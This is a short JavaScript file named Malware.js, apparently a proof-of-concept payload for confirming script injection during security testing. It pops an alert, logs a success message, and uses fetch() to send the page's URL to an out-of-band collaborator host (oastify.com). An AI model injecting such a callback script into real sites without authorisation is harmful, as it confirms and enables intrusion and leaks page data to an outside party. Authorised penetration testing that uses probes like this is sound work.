// Simple test script to confirm execution
alert("✅ Malware.js Executed!");

// Send execution confirmation to an external server
fetch("https://kj7dvxugl70erzrg71gi5b91lsrjfg35.oastify.com/execution?success=true&location=" + encodeURIComponent(window.location.href));


// Log execution in console (for debugging)
console.log("🚀 malware.js successfully injected and executed.");
